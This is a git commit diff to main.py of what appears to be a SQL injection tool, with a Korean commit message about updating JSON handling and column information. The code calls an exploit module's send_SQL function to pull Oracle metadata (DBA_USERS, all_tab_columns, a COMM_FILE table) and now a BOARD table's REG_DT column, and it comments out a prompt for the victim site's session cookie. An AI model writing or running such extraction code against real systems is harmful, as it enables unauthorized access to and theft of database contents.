7645decddd2540406527fe25474cf0178d493bfe
Gate36 <et9904@naver.com>
2024-03-17 17:24:39 +0900

    JSON 데이터 처리 코드 & 컬럼 정보 최신화

--- main.py
+++ main.py
@@ -6,9 +6,9 @@ if __name__ == "__main__":
     # exploit.send_SQL("USERNAME", "DBA_USERS")
     # exploit.send_SQL("column_name", "all_tab_columns", "COMM_FILE")
 
-    cookies = input("쿠키 값을 입력하세요: ")
-    query.set_cookies(cookies)
+    # cookies = input("쿠키 값을 입력하세요: ")
+    # query.set_cookies(cookies)
 
-    data = exploit.send_SQL("column_name", "all_tab_columns", "COMM_FILE")
+    data = exploit.send_SQL("REG_DT", "BOARD")
 
     print(data)
